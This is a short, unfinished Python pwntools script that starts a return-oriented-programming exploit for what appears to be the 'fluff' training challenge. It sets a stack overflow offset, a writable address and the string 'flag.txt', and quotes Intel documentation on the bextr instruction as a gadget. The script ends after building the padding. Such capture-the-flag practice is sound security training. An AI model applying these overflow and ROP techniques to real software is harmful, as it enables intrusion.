from pwn import *

elf = ELF("./fluff", checksec=False)
p = process("./fluff")
p.recvuntil(b"> ")

where = 0x00601028 # data section 
what = b"flag.txt"

offset = 0x20 + 8

# in questionableGadgets function there is an instruction with opcode bextr
# bextr stands for "bit field extraction". From Intel docs:

""" Extracts contiguous bits from the first source operand (the second operand) using an
index value and length value specified in the second source operand (the third
operand). Bit 7:0 of the first source operand specifies the starting bit position of bit
extraction. A START value exceeding the operand size will not extract any bits from
the second source operand. Bit 15:8 of the second source operand specifies the
maximum number of bits (LENGTH) beginning at the START position to extract. Only
bit positions up to (OperandSize -1) of the first source operand are extracted. The
extracted bits are written to the destination register, starting from the least signifi-
cant bit. All higher order bits in the destination operand (starting at bit position
LENGTH) are zeroed. The destination register is cleared if no bits are extracted. """

payload = b"A"*offset
